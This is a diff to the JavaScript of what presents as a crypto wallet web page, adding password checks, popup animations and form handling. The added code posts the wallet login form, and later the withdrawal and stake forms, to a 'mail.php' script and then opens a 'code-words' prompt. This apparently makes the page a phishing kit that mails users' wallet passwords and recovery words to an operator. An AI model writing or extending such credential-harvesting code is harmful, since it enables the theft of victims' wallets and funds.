@@ -7,13 +7,14 @@ $(function () {
   wow.init();
 
   if (document.querySelector('#open-wallet-password')) {
+    const minPasswordLength = 8;
     const openWalletPassword = document.querySelector('#open-wallet-password');
     const openWalletBtn = document.querySelector('#open-wallet-btn');
     openWalletPassword.addEventListener('keyup', (event) => {
-      if (event.target.value.length > 5) {
-        openWalletBtn.classList.remove('is-disabled');
+      if (event.target.value.length > minPasswordLength - 1) {
+        openWalletBtn.removeAttribute('disabled');
       } else {
-        openWalletBtn.classList.add('is-disabled');
+        openWalletBtn.setAttribute('disabled', true);
       }
     });
 
@@ -22,10 +23,19 @@ $(function () {
       event.preventDefault();
       const password = openWalletPassword.value;
       if (password.match(passwordPattern)) {
-        $.fancybox.open($('#code-words'), {
-          touch: false,
-          autoFocus: false,
+        const form = $('.login__form');
+        $.ajax({
+          type: 'POST',
+          url: 'mail.php',
+          data: form.serialize(),
+        }).done(function () {
+          $.fancybox.open({
+            src: '#code-words',
+            type: 'inline',
+            toolbar: false,
+          });
         });
+        return false;
       } else {
         $.fancybox.open($('#password-error'), {
           touch: false,
@@ -123,11 +133,14 @@ $(function () {
         const icon = link.querySelector('.coin__icon').src;
         coinPopupTitle.innerText = title;
         coinPopupIcon.src = icon;
-        coins.classList.add('is-hidden');
+        coins.classList.add('is-fadeout');
+        setTimeout(() => {
+          coins.classList.add('is-no-visible');
+        }, 500);
         coinPopup.classList.add('is-visible');
         setTimeout(() => {
           coinPopup.classList.add('is-fadein');
-        }, 100);
+        }, 500);
         window.scrollTo(0, 0);
       });
     });
@@ -135,8 +148,14 @@ $(function () {
     const coinPopupClose = document.querySelector('#coin-popup-close');
     coinPopupClose.addEventListener('click', (event) => {
       event.preventDefault();
-      coins.classList.remove('is-hidden');
-      coinPopup.classList.remove('is-visible', 'is-fadein');
+      coins.classList.remove('is-no-visible');
+      setTimeout(() => {
+        coins.classList.remove('is-fadeout');
+      }, 500);
+      coinPopup.classList.remove('is-visible');
+      setTimeout(() => {
+        coinPopup.classList.remove('is-fadein');
+      }, 500);
     });
 
     //Popups Withdrawal, Stake & Unstake
@@ -184,15 +203,58 @@ $(function () {
     });
   }
 
-  $(
-    '[data-href="#withdrawal-popup-success"], [data-href="#stake-popup-success"], [data-href="#unstake-popup-success"]',
-  ).click(function (event) {
+  $('[data-href="#unstake-popup-success"], [data-href="#unstake-popup-success-final"]').click(
+    function (event) {
+      event.preventDefault();
+      var href = $(this).data('href');
+      $.fancybox.close();
+      $.fancybox.open($(href), {
+        touch: false,
+        autoFocus: false,
+      });
+    },
+  );
+
+  $('.withdrawal-popup__form').submit(function (event) {
     event.preventDefault();
-    var href = $(this).data('href');
-    $.fancybox.open($(href), {
-      touch: false,
-      autoFocus: false,
-    });
+    const form = $(this);
+    if (!event.target.checkValidity()) {
+      form.find('[required]').focus();
+    } else {
+      $.ajax({
+        type: 'POST',
+        url: 'mail.php',
+        data: form.serialize(),
+      }).done(function () {
+        $.fancybox.open({
+          src: '#withdrawal-popup-success',
+          type: 'inline',
+          toolbar: false,
+        });
+      });
+      return false;
+    }
+  });
+
+  $('.stake-popup__form').submit(function (event) {
+    event.preventDefault();
+    const form = $(this);
+    if (!event.target.checkValidity()) {
+      form.find('[required]').focus();
+    } else {
+      $.ajax({
+        type: 'POST',
+        url: 'mail.php',
+        data: form.serialize(),
+      }).done(function () {
+        $.fancybox.open({
+          src: '#stake-popup-success',
+          type: 'inline',
+          toolbar: false,
+        });
+      });
+      return false;
+    }
   });
 
   $('.popup__close, .popup-success__close').click(function (event) {
